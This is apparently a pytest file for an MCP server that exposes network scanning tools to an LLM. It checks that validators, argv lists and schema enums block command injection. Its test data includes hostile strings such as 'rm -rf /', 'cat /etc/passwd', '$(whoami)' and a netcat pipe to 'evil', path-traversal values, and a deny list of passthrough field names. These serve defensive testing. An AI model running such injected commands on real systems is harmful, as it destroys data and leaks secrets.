"""Tests for the API-RedBox-MCP allowlist / no-passthrough invariants.

The reason this project exists is that a hallucinating or prompt-injected LLM
must not be able to reach arbitrary command execution. These tests assert the
two layers that guarantee it:

  1. Schema layer  — FastMCP/pydantic rejects out-of-allowlist values (enum,
     regex pattern) *before* our code runs. Exercised via ``mcp.call_tool``,
     the same entrypoint the MCP transport uses.
  2. Handler layer — the ``_validate_*`` helpers reject non-IP / non-URL inputs,
     and each tool routes through ``run_binary`` with an exact argv list, so
     shell metacharacters are inert and nothing is concatenated into a command
     string.

Real binaries are never executed: ``run_binary`` is always patched.
"""

from __future__ import annotations

import asyncio
from unittest.mock import patch

import pytest
from mcp.server.fastmcp.exceptions import ToolError

import server


def call_tool(name: str, arguments: dict):
    """Drive the async framework entrypoint (schema validation + dispatch) synchronously."""
    return asyncio.run(server.mcp.call_tool(name, arguments))


# ---------------------------------------------------------------------------
# Handler layer — validators
# ---------------------------------------------------------------------------


class TestValidateTargetIp:
    @pytest.mark.parametrize(
        "value",
        ["10.0.0.5", "192.168.1.1", "127.0.0.1", "::1", "2001:db8::1"],
    )
    def test_accepts_literal_ip(self, value):
        assert server._validate_target_ip(value) == value

    @pytest.mark.parametrize(
        "value",
        [
            "example.com",  # hostnames are not allowed — only literal IPs
            "api.target.com",
            "localhost",
            "10.0.0.5; rm -rf /",  # shell metacharacters
            "10.0.0.5 && cat /etc/passwd",
            "$(whoami)",
            "10.0.0.5|nc evil 4444",
            "10.0.0.5 -oN /tmp/out",  # smuggled extra nmap flag
            "999.999.999.999",
            "",
        ],
    )
    def test_rejects_non_ip(self, value):
        with pytest.raises(ValueError):
            server._validate_target_ip(value)


class TestValidateHttpUrl:
    @pytest.mark.parametrize(
        "value",
        ["http://10.0.0.5", "https://api.target.com/v1", "http://10.0.0.5/FUZZ"],
    )
    def test_accepts_http_urls(self, value):
        assert server._validate_http_url(value) == value

    @pytest.mark.parametrize(
        "value",
        [
            "ftp://host/file",
            "file:///etc/passwd",
            "javascript:alert(1)",
            "ssh://host",
            "gopher://host/_",
            "evil.com",
            "//evil.com",
            "",
            " http://10.0.0.5",  # leading space defeats the scheme check
        ],
    )
    def test_rejects_non_http(self, value):
        with pytest.raises(ValueError):
            server._validate_http_url(value)


class TestWordlistResolution:
    def test_all_aliases_resolve_under_wordlist_dir(self):
        prefix = str(server.WORDLIST_DIR) + "/"
        for alias in server.WORDLISTS:
            assert server._resolve_wordlist(alias).startswith(prefix)

    def test_wordlist_values_contain_no_path_traversal(self):
        for filename in server.WORDLISTS.values():
            assert "/" not in filename
            assert ".." not in filename

    def test_unknown_alias_raises(self):
        # A caller-supplied path can never be turned into a wordlist; only aliases.
        with pytest.raises(KeyError):
            server._resolve_wordlist("../../etc/passwd")


# ---------------------------------------------------------------------------
# Handler layer — each tool builds an exact argv list (no command string)
# ---------------------------------------------------------------------------


class TestToolArgvConstruction:
    def test_nmap_builds_expected_argv(self):
        with patch.object(server, "run_binary", return_value="OK") as rb:
            assert server.nmap_scan("10.0.0.5") == "OK"
        rb.assert_called_once_with(["nmap", "-Pn", "-sT", "-p", "1-1000", "10.0.0.5"])

    def test_nmap_places_scan_type_and_ports_positionally(self):
        with patch.object(server, "run_binary", return_value="OK") as rb:
            server.nmap_scan("10.0.0.5", ports="80,443", scan_type="-sV")
        rb.assert_called_once_with(["nmap", "-Pn", "-sV", "-p", "80,443", "10.0.0.5"])

    def test_nmap_rejects_hostname_before_exec(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.nmap_scan("api.target.com")
        rb.assert_not_called()

    def test_ffuf_builds_expected_argv(self):
        with patch.object(server, "run_binary", return_value="OK") as rb:
            server.ffuf_discover("http://10.0.0.5/FUZZ", wordlist="common")
        rb.assert_called_once_with(
            [
                "ffuf",
                "-u",
                "http://10.0.0.5/FUZZ",
                "-w",
                server._resolve_wordlist("common"),
                "-noninteractive",
            ]
        )

    def test_ffuf_requires_fuzz_keyword(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.ffuf_discover("http://10.0.0.5/")
        rb.assert_not_called()

    def test_ffuf_rejects_non_http(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.ffuf_discover("file:///etc/passwd?FUZZ")
        rb.assert_not_called()

    def test_arjun_builds_expected_argv(self):
        with patch.object(server, "run_binary", return_value="OK") as rb:
            server.arjun_params("http://10.0.0.5/api", method="POST")
        rb.assert_called_once_with(["arjun", "-u", "http://10.0.0.5/api", "-m", "POST"])

    def test_arjun_rejects_non_http(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.arjun_params("ftp://10.0.0.5")
        rb.assert_not_called()

    def test_nuclei_builds_expected_argv(self):
        with patch.object(server, "run_binary", return_value="OK") as rb:
            server.nuclei_scan("https://10.0.0.5/api")
        rb.assert_called_once_with(
            [
                "nuclei",
                "-u",
                "https://10.0.0.5/api",
                "-tags",
                "rest,api",
                "-templates",
                server.NUCLEI_TEMPLATE_DIR,
                "-disable-update-check",
            ]
        )

    def test_nuclei_rejects_non_http(self):
        with patch.object(server, "run_binary") as rb:
            with pytest.raises(ValueError):
                server.nuclei_scan("evil.com")
        rb.assert_not_called()

    def test_shell_metacharacters_in_url_stay_a_single_argv_token(self):
        # A URL passes scheme validation but may still contain metacharacters.
        # Defense in depth: it reaches the binary as ONE argv element, so with
        # shell=False the metacharacters are inert and nothing leaks into flags.
        nasty = "http://10.0.0.5/$(rm -rf /);id|nc evil 4444"
        with patch.object(server, "run_binary", return_value="OK") as rb:
            server.arjun_params(nasty)
        argv = rb.call_args.args[0]
        assert argv == ["arjun", "-u", nasty, "-m", "GET"]


# ---------------------------------------------------------------------------
# Schema layer — the framework rejects out-of-allowlist values before dispatch
# ---------------------------------------------------------------------------


class TestSchemaLayerRejectsOutOfAllowlist:
    def test_nmap_rejects_scan_type_outside_enum(self):
        with patch.object(server, "run_binary", return_value="OK"):
            with pytest.raises(ToolError):
                call_tool("nmap_scan", {"target": "10.0.0.5", "scan_type": "-O"})

    def test_nmap_rejects_ports_with_shell_metacharacters(self):
        with patch.object(server, "run_binary", return_value="OK"):
            with pytest.raises(ToolError):
                call_tool("nmap_scan", {"target": "10.0.0.5", "ports": "1; rm -rf /"})

    def test_nmap_rejects_overlong_ports(self):
        with patch.object(server, "run_binary", return_value="OK"):
            with pytest.raises(ToolError):
                call_tool("nmap_scan", {"target": "10.0.0.5", "ports": "1," * 40})

    def test_ffuf_rejects_arbitrary_wordlist_path(self):
        with patch.object(server, "run_binary", return_value="OK"):
            with pytest.raises(ToolError):
                call_tool(
                    "ffuf_discover",
                    {"url": "http://10.0.0.5/FUZZ", "wordlist": "/etc/passwd"},
                )

    def test_arjun_rejects_method_outside_enum(self):
        with patch.object(server, "run_binary", return_value="OK"):
            with pytest.raises(ToolError):
                call_tool("arjun_params", {"url": "http://10.0.0.5", "method": "DELETE"})

    def test_valid_call_through_framework_succeeds(self):
        with patch.object(server, "run_binary", return_value="SCAN-RESULT") as rb:
            _content, structured = call_tool("nmap_scan", {"target": "10.0.0.5"})
        assert structured == {"result": "SCAN-RESULT"}
        rb.assert_called_once()


# ---------------------------------------------------------------------------
# The hard invariant (SPECS.md §3): no tool exposes a free-form passthrough field
# ---------------------------------------------------------------------------


def test_no_tool_exposes_a_freeform_command_field():
    banned = {
        "command",
        "cmd",
        "args",
        "argv",
        "extra_args",
        "additional_flags",
        "additionalflags",
        "flags",
        "options",
        "shell",
        "exec",
        "raw",
    }
    for tool in asyncio.run(server.mcp.list_tools()):
        props = {k.lower() for k in tool.inputSchema.get("properties", {})}
        leaked = props & banned
        assert not leaked, f"{tool.name} exposes banned passthrough field(s): {leaked}"
